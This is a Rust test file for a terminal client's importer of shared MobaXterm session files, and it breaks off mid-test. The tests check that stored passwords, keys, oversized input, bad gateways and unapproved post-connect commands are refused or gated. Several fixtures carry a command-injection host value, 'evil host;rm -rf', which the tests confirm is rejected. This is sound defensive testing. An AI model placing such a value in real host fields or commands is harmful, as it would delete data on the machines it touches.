/*
 * Copyright 2026 Julien Bombled
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

//! Shared sessions, as the C# `SharedSessionProvider`: a `MobaXterm` file read for its SSH,
//! SFTP, RDP, Telnet and VNC sessions, in memory and read-only, followed when it changes,
//! and refused when it is not a file Heimdall can read.

use std::fmt::Write as _;
use std::path::Path;
use std::time::{Duration, SystemTime};

use heimdall_app::shared_sessions::{
    SharedSessions, SharedTarget, SourceProblem, SourceStatus, Variables, expand,
};
use heimdall_app::{App, AppConfig, Message};
use heimdall_core::settings::{Settings, settings_path};
use heimdall_core::shared_sessions::{MAX_SOURCE_FILE_BYTES, SharedSource, is_shared};
use heimdall_ssh::AgentSource;
use heimdall_term::GridSize;

const TEAM: &str = "[Bookmarks]\r\nSubRep=Prod\\Web\r\nImgNum=42\r\n\
web01= #109#0%web01.example.com%2222%deploy%%-1%-1%%%%%0%0%0%C:\\Keys\\id_rsa%%-1%0%0%0%%1080%%0\r\n\
desk= #91#4%desk.example.com%3390%admin%0%-1%-1%\r\n\
files= #130#6%files.example.com%21%bob%\r\n\
bad host= #109#0%evil host;rm -rf%22%root%\r\n\
ftp= #130#6%ftp.example.com%21%%\r\n\
[Passwords]\r\ndeploy@web01=SECRET-PASSWORD-VALUE\r\n";

fn source(id: &str, path: &Path) -> SharedSource {
    SharedSource {
        id: id.to_owned(),
        name: "Team".to_owned(),
        path: path.to_string_lossy().into_owned(),
        enabled: true,
    }
}

/// A moment after which a file just written has settled.
fn later() -> SystemTime {
    SystemTime::now() + Duration::from_secs(60)
}

fn loaded(dir: &Path, text: &str) -> (SharedSessions, Vec<SharedSource>) {
    let file = dir.join("team.mxtsessions");
    std::fs::write(&file, text).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = SharedSessions::default();
    shared.load(&sources, &Variables::default());
    (shared, sources)
}

#[test]
fn a_good_file_gives_its_ssh_and_rdp_sessions_and_says_what_it_left_out() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), TEAM);
    let state = &shared.sources()[0];
    assert_eq!(state.status, SourceStatus::Loaded);
    assert_eq!(state.sessions, 2, "{state:?}");
    // The two FTP sessions and the one with a host that is not one.
    assert_eq!(state.refused, 3);
    assert_eq!(state.ignored_passwords, 1);
    let sessions = shared.sessions_of("team");
    let SharedTarget::Ssh(ssh) = &sessions[0].target else {
        panic!("{sessions:?}");
    };
    assert_eq!((ssh.host.as_str(), ssh.port), ("web01.example.com", 2222));
    assert_eq!(ssh.username.as_deref(), Some("deploy"));
    assert_eq!(sessions[0].folder.as_deref(), Some("Prod/Web"));
    assert!(is_shared(sessions[0].id.as_str()));
    assert!(sessions[0].id.as_str().starts_with("shared-team-"));
    let SharedTarget::Rdp(rdp) = &sessions[1].target else {
        panic!("{sessions:?}");
    };
    assert_eq!((rdp.host.as_str(), rdp.port), ("desk.example.com", 3390));
}

#[test]
fn nothing_the_file_could_run_or_trust_comes_with_a_session() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), TEAM);
    let SharedTarget::Ssh(ssh) = &shared.sessions_of("team")[0].target else {
        panic!("an SSH session");
    };
    // The file names a key, a compression and an agent: none of it is the session's.
    assert!(ssh.key_path.is_none());
    assert!(ssh.gateway.is_none());
    assert!(ssh.post_connect.is_empty());
    assert!(!ssh.forward_agent && !ssh.compression);
    assert!(ssh.group.is_none(), "no saved folder's defaults reach it");
    assert!(ssh.vault_entry.is_none());
    // A stored password is counted and never read.
    let held = format!("{shared:?}");
    assert!(!held.contains("SECRET-PASSWORD-VALUE"), "{held}");
}

#[test]
fn the_file_is_only_read_and_a_session_handed_out_is_a_copy() {
    let dir = tempfile::tempdir().expect("dir");
    let (mut shared, sources) = loaded(dir.path(), TEAM);
    let file = dir.path().join("team.mxtsessions");
    let before = std::fs::read(&file).expect("read");
    let id = shared.sessions_of("team")[0].id.clone();
    let mut copy = shared.find(&id).expect("found");
    if let SharedTarget::Ssh(profile) = &mut copy.target {
        profile.host = "changed.example.com".to_owned();
    }
    assert_ne!(shared.find(&id), Some(copy), "the copy is not the held one");
    shared.refresh(&sources, &Variables::default(), later());
    assert_eq!(std::fs::read(&file).expect("read"), before);
    assert!(
        !std::fs::metadata(&file)
            .expect("metadata")
            .permissions()
            .readonly(),
        "the file's permissions are left as they were"
    );
}

#[test]
fn a_file_that_is_not_usable_loads_nothing_and_says_why() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), "this is not a session file\n\u{0}\u{1}");
    let state = &shared.sources()[0];
    assert_eq!(state.status, SourceStatus::Failed(SourceProblem::Empty));
    assert_eq!(shared.sessions().count(), 0);

    let mut missing = SharedSessions::default();
    missing.load(
        &[source("gone", &dir.path().join("nowhere.ini"))],
        &Variables::default(),
    );
    assert_eq!(
        missing.sources()[0].status,
        SourceStatus::Failed(SourceProblem::Missing)
    );

    let big = dir.path().join("big.ini");
    let file = std::fs::File::create(&big).expect("create");
    file.set_len(MAX_SOURCE_FILE_BYTES + 1).expect("length");
    let mut oversized = SharedSessions::default();
    oversized.load(&[source("big", &big)], &Variables::default());
    assert_eq!(
        oversized.sources()[0].status,
        SourceStatus::Failed(SourceProblem::TooLarge)
    );
    assert_eq!(oversized.sessions().count(), 0);
}

#[test]
fn a_source_with_a_bad_identifier_a_repeated_one_or_no_path_is_reported() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let mut off = source("off", &file);
    off.enabled = false;
    let mut no_path = source("nopath", &file);
    no_path.path = "  ".to_owned();
    let sources = vec![
        source("Bad-Id", &file),
        source("team", &file),
        source("team", &file),
        off,
        no_path,
    ];
    let mut shared = SharedSessions::default();
    shared.load(&sources, &Variables::default());
    let statuses: Vec<_> = shared.sources().iter().map(|s| s.status.clone()).collect();
    assert_eq!(
        statuses,
        vec![
            SourceStatus::Failed(SourceProblem::InvalidId),
            SourceStatus::Loaded,
            SourceStatus::Failed(SourceProblem::DuplicateId),
            SourceStatus::Disabled,
            SourceStatus::Failed(SourceProblem::NoPath),
        ]
    );
    assert_eq!(shared.sessions().count(), 2, "only the good source's");
}

#[test]
fn a_changed_file_is_read_again_and_a_worse_one_keeps_the_previous_sessions() {
    let dir = tempfile::tempdir().expect("dir");
    let (mut shared, sources) = loaded(dir.path(), TEAM);
    let file = dir.path().join("team.mxtsessions");
    assert!(
        !shared.refresh(&sources, &Variables::default(), later()),
        "nothing changed"
    );

    std::fs::write(
        &file,
        "[Bookmarks]\r\nonly= #109#0%only.example.com%22%me%\r\nsecond= #109#0%second.example.com%22%me%\r\n",
    )
    .expect("write");
    // Just written: left to settle.
    assert!(!shared.refresh(&sources, &Variables::default(), SystemTime::now()));
    assert_eq!(shared.sources()[0].sessions, 2);
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    let names: Vec<_> = shared.sessions().map(|s| s.name().to_owned()).collect();
    assert_eq!(names, ["only", "second"]);

    // A file that no longer parses: the sessions held stay, with the reason.
    std::fs::write(&file, "garbage, garbage and more garbage").expect("write");
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    let state = &shared.sources()[0];
    assert_eq!(state.status, SourceStatus::Loaded);
    assert_eq!(state.kept_previous, Some(SourceProblem::Empty));
    assert_eq!(shared.sessions().count(), 2);

    // Gone: nothing stays connectable from a file that is not there.
    std::fs::remove_file(&file).expect("remove");
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    assert_eq!(
        shared.sources()[0].status,
        SourceStatus::Failed(SourceProblem::Missing)
    );
    assert_eq!(shared.sessions().count(), 0);

    // Back and good: the notice goes.
    std::fs::write(&file, TEAM).expect("write");
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    assert_eq!(shared.sources()[0].kept_previous, None);
    assert_eq!(shared.sessions().count(), 2);
}

#[test]
fn a_source_removed_from_the_settings_takes_its_sessions_with_it() {
    let dir = tempfile::tempdir().expect("dir");
    let (mut shared, _) = loaded(dir.path(), TEAM);
    assert!(shared.refresh(&[], &Variables::default(), later()));
    assert!(shared.is_empty());
    assert_eq!(shared.sessions().count(), 0);
}

#[test]
fn variables_of_a_path_are_expanded_and_an_unset_one_stays_as_written() {
    // SAFETY-free: a variable every system sets.
    let path = std::env::var("PATH").expect("PATH");
    assert_eq!(expand("%PATH%"), path);
    assert_eq!(
        expand(" %HEIMDALL_NO_SUCH_VARIABLE%\\x "),
        "%HEIMDALL_NO_SUCH_VARIABLE%\\x"
    );
    assert_eq!(expand("100%"), "100%");
}

fn app_with_source(dir: &Path) -> App {
    let file = dir.join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let profiles_file = dir.join("profiles.toml");
    let settings = Settings {
        shared_sources: vec![source("team", &file)],
        ..Settings::default()
    };
    settings
        .save(&settings_path(&profiles_file))
        .expect("settings");
    App::new(AppConfig {
        profiles_file,
        known_hosts: dir.join("known_hosts"),
        legacy_dir: None,
        agent: AgentSource::Disabled,
        initial_grid: GridSize { cols: 80, rows: 24 },
        files_start: dir.to_owned(),
        system_credentials: heimdall_app::SystemCredentials::memory(),
    })
}

#[test]
fn the_app_holds_them_apart_from_the_saved_profiles_and_opens_one_never_saved() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_source(dir.path());
    assert_eq!(app.shared_sessions().sessions().count(), 2);
    assert!(app.watches_shared_sources());
    // Not among the saved profiles: no menu that edits or deletes one can reach them.
    assert!(app.profile_summaries().is_empty());
    assert!(app.profiles().is_empty());
    let id = app
        .shared_sessions()
        .sessions()
        .next()
        .expect("one")
        .id
        .clone();
    assert!(app.profile_summary(&id).is_none());

    let before = app.tabs.len();
    let effects = app.update(Message::ConnectShared(id));
    assert!(!effects.is_empty(), "a connection starts");
    assert_eq!(app.tabs.len(), before + 1);
    assert!(app.profiles().is_empty(), "nothing is saved by opening it");
}

#[test]
fn an_unknown_shared_identifier_opens_nothing() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_source(dir.path());
    let effects = app.update(Message::ConnectShared(
        heimdall_core::profile::ProfileId::new("shared-team-0000"),
    ));
    assert!(effects.is_empty());
    assert!(app.tabs.is_empty());
}

#[test]
fn a_crafted_folder_cannot_make_the_reader_allocate_without_bound() {
    // An 8 MiB folder and a thousand tiny sessions: copied into each, that is 8 GiB.
    let mut text = String::from("[Bookmarks]\nSubRep=");
    text.push_str(&"F".repeat(8 * 1024 * 1024));
    text.push('\n');
    for index in 0..1000 {
        let _ = writeln!(text, "s{index}= #109#0%h{index}.example.com%22%u%");
    }
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), &text);
    // The section whose folder is too long is not taken at all: the file read, nothing in it
    // was kept, and nothing earlier is brought back for it.
    assert_eq!(shared.sources()[0].status, SourceStatus::Loaded);
    assert_eq!(shared.sources()[0].sessions, 0);
    assert_eq!(shared.sessions().count(), 0);

    // A long name is left out on its own, the others are kept and the notice counts it.
    let long = "n".repeat(100_000);
    let text = format!(
        "[Bookmarks]\nSubRep=Ok
{long}= #109#0%a.example.com%22%u%\nfine= #109#0%b.example.com%22%u%\n"
    );
    let (shared, _) = loaded(dir.path(), &text);
    assert_eq!(shared.sessions().count(), 1);
    assert_eq!(shared.sources()[0].skipped_entries, 1);
}

#[test]
fn a_file_with_more_entries_than_a_source_may_hold_is_cut_and_says_so() {
    let mut text = String::from("[Bookmarks]\n");
    for index in 0..30_000 {
        let _ = writeln!(text, "s{index}= #109#0%h{index}.example.com%22%u%");
    }
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), &text);
    let state = &shared.sources()[0];
    assert!(state.truncated, "{state:?}");
    assert!(shared.sessions().count() <= 5000);
}

#[test]
fn malformed_entries_next_to_good_ones_are_skipped_and_counted() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(
        dir.path(),
        "[Bookmarks]
good= #109#0%ok.example.com%22%u%
broken=nonsense
nohost= #109#0%%22%u%
",
    );
    let state = &shared.sources()[0];
    assert_eq!(state.sessions, 1);
    assert_eq!(state.skipped_entries, 2);
}

#[test]
fn stored_passwords_are_counted_and_no_value_is_kept() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(
        dir.path(),
        "[Bookmarks]
good= #109#0%ok.example.com%22%u%
[Passwords]
a@b=TOPSECRET1
c@d=TOPSECRET2
[Credentials]
e=TOPSECRET3
",
    );
    assert_eq!(shared.sources()[0].ignored_passwords, 3);
    let held = format!("{shared:?}");
    assert!(!held.contains("TOPSECRET"), "{held}");
}

#[test]
fn the_users_variables_fill_in_a_login_as_the_file_import_does() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("vars.mxtsessions");
    std::fs::write(
        &file,
        "[Bookmarks]
web= #109#0%web.example.com%22%[ADMIN]%
",
    )
    .expect("write");
    let sources = vec![source("vars", &file)];
    let variables = std::collections::BTreeMap::from([("ADMIN".to_owned(), "alice".to_owned())]);
    let mut shared = SharedSessions::default();
    shared.load(&sources, &variables);
    let SharedTarget::Ssh(ssh) = &shared.sessions_of("vars")[0].target else {
        panic!("an SSH session");
    };
    assert_eq!(ssh.username.as_deref(), Some("alice"));
}

/// A shared set that holds the kinds of finding a report lists.
const REPORTED: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
web01= #109#0%web01.example.com%22%[GHOST]%\r\n\
db= #109#0%db01.example.com%22%admin%\r\n\
replica= #109#0%db01.example.com%22%admin%\r\n\
bad host= #109#0%evil host;rm -rf%22%root%\r\n\
ftp= #130#6%ftp.example.com%21%%\r\n\
[Passwords]\r\nadmin@db=SECRET-PASSWORD-VALUE\r\n";

fn cached(dir: &Path) -> SharedSessions {
    let mut shared = SharedSessions::default();
    shared.set_cache_directory(Some(dir.join("cache")));
    shared
}

#[test]
fn the_report_lists_what_was_not_taken_as_it_stood() {
    use heimdall_app::shared_report::{ReportCheck, SkipReason};
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), REPORTED);
    let report = shared.report_of("team").expect("a report");
    let skipped: Vec<_> = report
        .entries
        .iter()
        .filter(|entry| entry.check == ReportCheck::SkippedSession)
        .map(|entry| (entry.session.as_str(), entry.reason, entry.detail.as_str()))
        .collect();
    assert!(skipped.contains(&(
        "bad host",
        Some(SkipReason::InvalidHost),
        "evil host;rm -rf"
    )));
    assert!(
        skipped
            .iter()
            .any(|(name, reason, _)| *name == "ftp" && *reason == Some(SkipReason::FtpNotSupported))
    );
    let unresolved = report
        .entries
        .iter()
        .find(|entry| entry.check == ReportCheck::UnresolvedVariable)
        .expect("an unresolved variable");
    assert_eq!(
        (
            unresolved.session.as_str(),
            unresolved.detail.as_str(),
            unresolved.folder.as_str()
        ),
        ("web01", "GHOST", "Prod")
    );
    // "db" and "replica" share a host in one folder, and "replica" is not its host's name.
    assert_eq!(report.count_of(ReportCheck::DuplicateHost), 2);
    assert!(report.entries.iter().any(
        |entry| entry.check == ReportCheck::NameHostMismatch && entry.session == "replica"
    ));
    assert!(shared.report_of("nobody").is_none());
}

#[test]
fn a_source_read_leaves_a_private_copy_with_no_password_in_it() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, REPORTED).expect("write");
    let mut shared = cached(dir.path());
    shared.load(&[source("team", &file)], &Variables::default());
    let copy = dir.path().join("cache").join("team.json");
    let text = std::fs::read_to_string(&copy).expect("a copy");
    assert!(text.contains("db01.example.com"));
    assert!(!text.contains("SECRET-PASSWORD-VALUE"), "{text}");
    // Only the count of passwords is kept, never the section nor what it holds.
    assert!(
        !text.contains("[Passwords]") && !text.contains("admin@db"),
        "{text}"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let mode = std::fs::metadata(&copy).expect("meta").permissions().mode();
        assert_eq!(mode & 0o077, 0, "readable by the user alone");
    }
}

#[test]
fn an_unreachable_source_offers_its_offline_copy_with_a_notice() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    assert!(shared.sources()[0].offline.is_none());
    let online: Vec<_> = shared.sessions().map(|s| s.id.clone()).collect();
    // The next start, with the share gone: nothing in memory, the copy answers.
    std::fs::remove_file(&file).expect("remove");
    let mut restarted = cached(dir.path());
    restarted.load(&sources, &Variables::default());
    let state = &restarted.sources()[0];
    assert_eq!(state.status, SourceStatus::Loaded);
    assert_eq!(state.sessions, 2);
    let offline = state.offline.as_ref().expect("an offline copy");
    assert_eq!(offline.reason, SourceProblem::Missing);
    let offered: Vec<_> = restarted.sessions().map(|s| s.id.clone()).collect();
    assert_eq!(
        offered, online,
        "the very sessions, under the very identifiers"
    );
    let SharedTarget::Ssh(ssh) = &restarted.sessions_of("team")[0].target else {
        panic!("an SSH session");
    };
    assert_eq!(ssh.host, "web01.example.com");
    assert_eq!(ssh.port, 2222);
    assert_eq!(ssh.username.as_deref(), Some("deploy"));
    assert!(ssh.key_path.is_none(), "a key path never comes back");
    // The file coming back replaces the copy at the next look.
    std::fs::write(&file, TEAM).expect("write");
    assert!(restarted.refresh(&sources, &Variables::default(), later()));
    assert!(restarted.sources()[0].offline.is_none());
}

#[test]
fn a_moved_file_does_not_use_the_copy_of_another() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let mut shared = cached(dir.path());
    shared.load(&[source("team", &file)], &Variables::default());
    // The source now points at another file that is not there: not this source's copy.
    let moved = dir.path().join("moved.mxtsessions");
    let mut restarted = cached(dir.path());
    restarted.load(&[source("team", &moved)], &Variables::default());
    assert_eq!(
        restarted.sources()[0].status,
        SourceStatus::Failed(SourceProblem::Missing)
    );
    assert_eq!(restarted.sessions().count(), 0);
    // Without a cache folder, nothing is made nor used.
    let mut none = SharedSessions::default();
    std::fs::remove_file(&file).expect("remove");
    none.load(&[source("team", &file)], &Variables::default());
    assert_eq!(none.sessions().count(), 0);
}

#[test]
fn a_tampered_copy_goes_through_the_checks_of_a_file() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    let copy = dir.path().join("cache").join("team.json");
    let text = std::fs::read_to_string(&copy).expect("a copy");
    std::fs::write(&copy, text.replace("web01.example.com", "evil host;rm -rf")).expect("write");
    std::fs::remove_file(&file).expect("remove");
    let mut restarted = cached(dir.path());
    restarted.load(&sources, &Variables::default());
    let hosts: Vec<_> = restarted
        .sessions()
        .map(|session| session.endpoint().0.to_owned())
        .collect();
    assert_eq!(hosts, ["desk.example.com"], "the bad host is refused again");
}

#[test]
fn a_source_taken_out_of_the_settings_leaves_no_copy() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, TEAM).expect("write");
    let mut shared = cached(dir.path());
    shared.load(&[source("team", &file)], &Variables::default());
    assert!(dir.path().join("cache").join("team.json").exists());
    shared.load(&[], &Variables::default());
    assert!(!dir.path().join("cache").join("team.json").exists());
}

#[test]
fn the_settings_keep_a_list_of_sources_that_passes_the_rows_checks_and_refuse_any_other() {
    use heimdall_app::SettingsMessage;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_source(dir.path());
    let row = |id: &str, name: &str, path: &str| SharedSource {
        id: id.to_owned(),
        name: name.to_owned(),
        path: path.to_owned(),
        enabled: true,
    };
    let abs = dir
        .path()
        .join("other.mxtsessions")
        .to_string_lossy()
        .into_owned();
    // Padding is trimmed, as the C# Save trims it.
    app.update(Message::Settings(SettingsMessage::SharedSources(vec![
        row("one", "  Ops  ", &format!(" {abs} ")),
        row("two", "Lab", &abs),
    ])));
    let kept = &app.settings().shared_sources;
    assert_eq!(kept.len(), 2);
    assert_eq!(
        (kept[0].name.as_str(), kept[0].path.as_str()),
        ("Ops", abs.as_str())
    );
    assert_eq!(app.shared_sessions().sources().len(), 2, "followed at once");
    // A relative path, a repeated name in another case, a repeated or invalid id, no name.
    for refused in [
        vec![row("one", "Ops", "relative.mxtsessions")],
        vec![row("one", "Ops", &abs), row("two", "ops", &abs)],
        vec![row("one", "Ops", &abs), row("one", "Lab", &abs)],
        vec![row("Bad-Id", "Ops", &abs)],
        vec![row("one", " ", &abs)],
    ] {
        app.update(Message::Settings(SettingsMessage::SharedSources(refused)));
        assert_eq!(app.settings().shared_sources.len(), 2);
    }
    // Removing them all is a choice too.
    app.update(Message::Settings(
        SettingsMessage::SharedSources(Vec::new()),
    ));
    assert!(app.settings().shared_sources.is_empty());
}

const BEHIND_A_BASTION: &str = "[Bookmarks]\r\n\
inner= #109#0%inner.example.com%22%deploy%%-1%-1%%jump.example.com%2200%[ops]\r\n\
desk= #91#4%desk.example.com%3389%admin%0%-1%-1%%%%%%%jump.example.com%2200%OPS\r\n\
open= #109#0%open.example.com%22%deploy\r\n\
evil= #109#0%evil.example.com%22%deploy%%-1%-1%%bad host%22%x\r\n";

#[test]
fn a_shared_session_keeps_the_gateway_its_file_names_and_a_bad_one_refuses_the_session() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, BEHIND_A_BASTION).expect("write");
    let variables = Variables::from([("ops".to_owned(), "ops".to_owned())]);
    let mut shared = SharedSessions::default();
    shared.load(&[source("team", &file)], &variables);
    let state = &shared.sources()[0];
    assert_eq!(state.sessions, 3, "{state:?}");
    assert_eq!(state.refused, 1, "the one whose gateway is not a host");
    let report = shared.report_of("team").expect("report");
    assert!(
        report.entries.iter().any(|entry| entry.reason
            == Some(heimdall_app::shared_report::SkipReason::InvalidGateway)
            && entry.session == "evil"
            && entry.detail == "bad host"),
        "{report:?}"
    );
    // The two sessions through the same host, port and account (any case) share one gateway,
    // in the shared namespace, with a host, a port and an account and nothing else.
    let gateways = shared.gateways();
    assert_eq!(gateways.len(), 1, "{gateways:?}");
    let gateway = &gateways[0];
    assert!(is_shared(gateway.id.as_str()));
    assert_eq!(
        (gateway.host.as_str(), gateway.port),
        ("jump.example.com", 2200)
    );
    assert_eq!(gateway.username.as_deref(), Some("ops"));
    assert!(gateway.key_path.is_none() && gateway.parent.is_none());
    let sessions = shared.sessions_of("team");
    let SharedTarget::Ssh(inner) = &sessions[0].target else {
        panic!("{sessions:?}");
    };
    assert_eq!(inner.gateway.as_ref(), Some(&gateway.id));
    let SharedTarget::Rdp(desk) = &sessions[1].target else {
        panic!("{sessions:?}");
    };
    assert_eq!(desk.gateway.as_ref(), Some(&gateway.id));
    let SharedTarget::Ssh(open) = &sessions[2].target else {
        panic!("{sessions:?}");
    };
    assert!(open.gateway.is_none());
}

#[test]
fn a_shared_gateway_login_takes_the_users_variables() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, BEHIND_A_BASTION).expect("write");
    let variables = Variables::from([("ops".to_owned(), "jb".to_owned())]);
    let mut shared = SharedSessions::default();
    shared.load(&[source("team", &file)], &variables);
    let users: Vec<Option<String>> = shared
        .gateways()
        .into_iter()
        .map(|gateway| gateway.username)
        .collect();
    assert_eq!(users, [Some("jb".to_owned()), Some("OPS".to_owned())]);
}

#[test]
fn a_shared_gateway_never_joins_the_saved_ones_and_nothing_is_written() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, BEHIND_A_BASTION).expect("write");
    let profiles_file = dir.path().join("profiles.toml");
    let settings = Settings {
        shared_sources: vec![source("team", &file)],
        ..Settings::default()
    };
    settings
        .save(&settings_path(&profiles_file))
        .expect("settings");
    let app = App::new(AppConfig {
        profiles_file: profiles_file.clone(),
        known_hosts: dir.path().join("known_hosts"),
        legacy_dir: None,
        agent: AgentSource::Disabled,
        initial_grid: GridSize { cols: 80, rows: 24 },
        files_start: dir.path().to_owned(),
        system_credentials: heimdall_app::SystemCredentials::memory(),
    });
    // No variable is defined here: `[ops]` and `OPS` are two logins, so two gateways.
    assert_eq!(app.shared_sessions().gateways().len(), 2);
    // Not among the saved gateways, and nothing written to the store.
    assert!(app.gateways().is_empty());
    assert!(app.profiles().is_empty());
}

#[test]
fn a_copy_of_a_source_keeps_the_gateway_and_a_copy_without_a_usable_one_drops_the_session() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, BEHIND_A_BASTION).expect("write");
    let sources = vec![source("team", &file)];
    let cache = dir.path().join("cache");
    let mut shared = SharedSessions::default();
    shared.set_cache_directory(Some(cache.clone()));
    shared.load(&sources, &Variables::default());
    let before = shared.gateways();
    // The share disappears: the copy serves, gateway included.
    std::fs::remove_file(&file).expect("remove");
    let mut offline = SharedSessions::default();
    offline.set_cache_directory(Some(cache.clone()));
    offline.load(&sources, &Variables::default());
    assert!(offline.sources()[0].offline.is_some());
    assert_eq!(offline.gateways(), before);
    let SharedTarget::Ssh(inner) = &offline.sessions_of("team")[0].target else {
        panic!("an SSH session");
    };
    assert_eq!(inner.gateway.as_ref(), Some(&before[0].id));
    // A gateway of the copy that is not a host: the sessions through it are not served.
    let copy = cache.join("team.json");
    let text = std::fs::read_to_string(&copy).expect("copy");
    std::fs::write(&copy, text.replace("jump.example.com", "bad host")).expect("tamper");
    let mut tampered = SharedSessions::default();
    tampered.set_cache_directory(Some(cache));
    tampered.load(&sources, &Variables::default());
    let hosts: Vec<&str> = tampered
        .sessions_of("team")
        .iter()
        .map(|session| session.endpoint().0)
        .collect();
    assert_eq!(hosts, ["open.example.com"], "no session goes direct");
}

/// A file whose SSH sessions ask for a command after connecting, and an RDP one that cannot.
const WITH_COMMAND: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
web= #109#0%web.example.com%22%deploy%%%%sudo -i%%\r\n\
esc= #109#0%esc.example.com%22%deploy%%%%echo \u{1b}[31mhi%%\r\n\
desk= #91#4%desk.example.com%3390%admin%0%-1%-1%whoami\r\n";

fn app_with_text(dir: &Path, text: &str) -> App {
    let file = dir.join("team.mxtsessions");
    std::fs::write(&file, text).expect("write");
    let profiles_file = dir.join("profiles.toml");
    let settings = Settings {
        shared_sources: vec![source("team", &file)],
        ..Settings::default()
    };
    settings
        .save(&settings_path(&profiles_file))
        .expect("settings");
    App::new(AppConfig {
        profiles_file,
        known_hosts: dir.join("known_hosts"),
        legacy_dir: None,
        agent: AgentSource::Disabled,
        initial_grid: GridSize { cols: 80, rows: 24 },
        files_start: dir.to_owned(),
        system_credentials: heimdall_app::SystemCredentials::memory(),
    })
}

fn id_of(app: &App, name: &str) -> heimdall_core::profile::ProfileId {
    app.shared_sessions()
        .sessions()
        .find(|session| session.name() == name)
        .unwrap_or_else(|| panic!("no session {name}"))
        .id
        .clone()
}

/// The steps a connection started by `effects` would type.
fn typed(effects: &[heimdall_app::Effect]) -> Vec<heimdall_core::post_connect::PostConnectStep> {
    match effects {
        [heimdall_app::Effect::Connect { request, .. }] => request.profile.post_connect.to_run(),
        other => panic!("expected one Connect, got {other:?}"),
    }
}

#[test]
fn a_command_the_file_asks_for_is_kept_as_an_unapproved_step_for_ssh_only() {
    use heimdall_core::post_connect::PostConnectStep;
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), WITH_COMMAND);
    let sessions = shared.sessions_of("team");
    let ssh = |name: &str| {
        sessions
            .iter()
            .find_map(|session| match &session.target {
                SharedTarget::Ssh(profile) if profile.name == name => Some(profile),
                _ => None,
            })
            .expect("a session")
    };
    let web = ssh("web");
    assert_eq!(
        web.post_connect.steps,
        [PostConnectStep::new("sudo -i").from_outside()],
        "each step waits for its own Run"
    );
    assert!(
        web.post_connect.approved.is_none(),
        "the file approves nothing"
    );
    assert!(web.post_connect.needs_approval());
    assert!(
        web.post_connect.to_run().is_empty(),
        "nothing is typed unapproved"
    );
    // A command with a control character is not shown to be approved: it is dropped.
    assert!(ssh("esc").post_connect.steps.is_empty());
}

#[test]
fn a_shared_command_is_asked_about_then_remembered_for_those_commands_only() {
    use heimdall_core::post_connect::PostConnectStep;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    let id = id_of(&app, "web");

    // Asked first, with the exact command, and nothing opens meanwhile.
    let effects = app.update(Message::ConnectShared(id.clone()));
    assert!(effects.is_empty(), "{effects:?}");
    assert!(app.tabs.is_empty());
    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &app.dialog else {
        panic!("{:?}", app.dialog);
    };
    assert!(asked.shared);
    assert_eq!(asked.commands, ["sudo -i"]);

    // Approved: typed, remembered on this computer against the shared session.
    let effects = app.update(Message::ConfirmDialog);
    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
    assert!(
        app.settings()
            .shared_post_connect_approvals
            .contains_key(id.as_str())
    );
    assert!(
        app.profiles().is_empty(),
        "no saved profile took the approval"
    );
    let saved =
        Settings::load(&settings_path(&dir.path().join("profiles.toml"))).expect("settings");
    assert_eq!(
        saved.shared_post_connect_approvals[id.as_str()].steps,
        [PostConnectStep::new("sudo -i")]
    );

    // The next time, and a restart, ask nothing as long as the file says the same.
